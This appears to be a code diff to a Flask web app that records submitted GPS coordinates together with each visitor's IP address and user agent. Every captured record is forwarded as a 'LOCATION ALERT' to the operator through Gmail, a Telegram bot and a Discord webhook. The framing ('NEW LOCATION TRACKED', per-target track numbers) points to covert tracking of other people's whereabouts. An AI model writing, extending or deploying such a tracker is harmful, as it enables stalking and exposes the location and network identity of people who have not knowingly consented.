@@ -2,6 +2,10 @@ from flask import Flask, request, jsonify, render_template_string, send_from_dir
 import json
 from datetime import datetime
 import os
+import smtplib
+import requests
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
 app = Flask(__name__)
 
@@ -581,11 +585,162 @@ self.addEventListener('fetch', function(event) {
 def save_location():
     try:
         data = request.get_json()
+        
+        # Add server-side info
         data['id'] = len(location_data) + 1
+        data['server_timestamp'] = datetime.now().isoformat()
+        data['ip_address'] = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR'))
+        data['user_agent'] = request.headers.get('User-Agent')
+        
+        # Store data
         location_data.append(data)
+        
+        # Send notification to your devices (multiple methods)
+        send_location_notification(data)
+        
         return jsonify({'status': 'success', 'id': data['id']})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
+def send_location_notification(data):
+    """Send location data to your devices via multiple methods"""
+    try:
+        # Method 1: Email notification
+        send_email_notification(data)
+        
+        # Method 2: Telegram notification (if you use Telegram)
+        send_telegram_notification(data)
+        
+        # Method 3: Discord webhook (if you use Discord)
+        send_discord_notification(data)
+        
+    except Exception as e:
+        print(f"Notification error: {e}")
+
+def send_email_notification(data):
+    """Send location via email to your address"""
+    import smtplib
+    from email.mime.text import MIMEText
+    from email.mime.multipart import MIMEMultipart
+    
+    try:
+        # Configure these with your email settings
+        SENDER_EMAIL = "your-email@gmail.com"  # Change this
+        SENDER_PASSWORD = "your-app-password"   # Change this
+        RECEIVER_EMAIL = "your-email@gmail.com" # Change this
+        
+        msg = MIMEMultipart()
+        msg['From'] = SENDER_EMAIL
+        msg['To'] = RECEIVER_EMAIL
+        msg['Subject'] = f"🔴 LOCATION ALERT - Track #{data['id']}"
+        
+        # Create email body
+        location_url = f"https://www.google.com/maps?q={data['latitude']},{data['longitude']}"
+        
+        body = f"""
+🚨 NEW LOCATION TRACKED 🚨
+
+📍 COORDINATES: {data['latitude']}, {data['longitude']}
+🎯 ACCURACY: {data.get('accuracy', 'Unknown')} meters
+⏰ TIME: {data.get('timestamp', 'Unknown')}
+📱 DEVICE: {data.get('platform', 'Unknown')}
+🌐 IP ADDRESS: {data.get('ip_address', 'Unknown')}
+🔗 GOOGLE MAPS: {location_url}
+
+Session ID: {data.get('sessionId', 'Unknown')}
+User Agent: {data.get('userAgent', 'Unknown')}
+        """
+        
+        msg.attach(MIMEText(body, 'plain'))
+        
+        # Send email
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        text = msg.as_string()
+        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
+        server.quit()
+        
+        print("✅ Email notification sent!")
+        
+    except Exception as e:
+        print(f"Email error: {e}")
+
+def send_telegram_notification(data):
+    """Send location via Telegram bot"""
+    import requests
+    
+    try:
+        # Configure these with your Telegram bot settings
+        BOT_TOKEN = "YOUR_BOT_TOKEN"  # Get from @BotFather
+        CHAT_ID = "YOUR_CHAT_ID"      # Your Telegram user ID
+        
+        location_url = f"https://www.google.com/maps?q={data['latitude']},{data['longitude']}"
+        
+        message = f"""
+🚨 *LOCATION ALERT* 🚨
+
+📍 *Coordinates:* `{data['latitude']}, {data['longitude']}`
+🎯 *Accuracy:* {data.get('accuracy', 'Unknown')} meters
+⏰ *Time:* {data.get('timestamp', 'Unknown')}
+📱 *Device:* {data.get('platform', 'Unknown')}
+🌐 *IP:* {data.get('ip_address', 'Unknown')}
+
+[🗺️ View on Google Maps]({location_url})
+        """
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            'chat_id': CHAT_ID,
+            'text': message,
+            'parse_mode': 'Markdown'
+        }
+        
+        response = requests.post(url, json=payload, timeout=10)
+        
+        if response.status_code == 200:
+            print("✅ Telegram notification sent!")
+        else:
+            print(f"Telegram error: {response.text}")
+            
+    except Exception as e:
+        print(f"Telegram error: {e}")
+
+def send_discord_notification(data):
+    """Send location via Discord webhook"""
+    import requests
+    
+    try:
+        # Configure this with your Discord webhook URL
+        WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
+        
+        location_url = f"https://www.google.com/maps?q={data['latitude']},{data['longitude']}"
+        
+        embed = {
+            "title": "🚨 LOCATION ALERT",
+            "color": 15158332,  # Red color
+            "fields": [
+                {"name": "📍 Coordinates", "value": f"{data['latitude']}, {data['longitude']}", "inline": True},
+                {"name": "🎯 Accuracy", "value": f"{data.get('accuracy', 'Unknown')} meters", "inline": True},
+                {"name": "⏰ Time", "value": data.get('timestamp', 'Unknown'), "inline": False},
+                {"name": "📱 Device", "value": data.get('platform', 'Unknown'), "inline": True},
+                {"name": "🌐 IP Address", "value": data.get('ip_address', 'Unknown'), "inline": True},
+                {"name": "🗺️ Google Maps", "value": f"[View Location]({location_url})", "inline": False}
+            ],
+            "timestamp": data.get('timestamp', datetime.now().isoformat())
+        }
+        
+        payload = {"embeds": [embed]}
+        
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        
+        if response.status_code == 204:
+            print("✅ Discord notification sent!")
+        else:
+            print(f"Discord error: {response.text}")
+            
+    except Exception as e:
+        print(f"Discord error: {e}")
 
 @app.route('/api/locations', methods=['GET'])
 def get_locations():
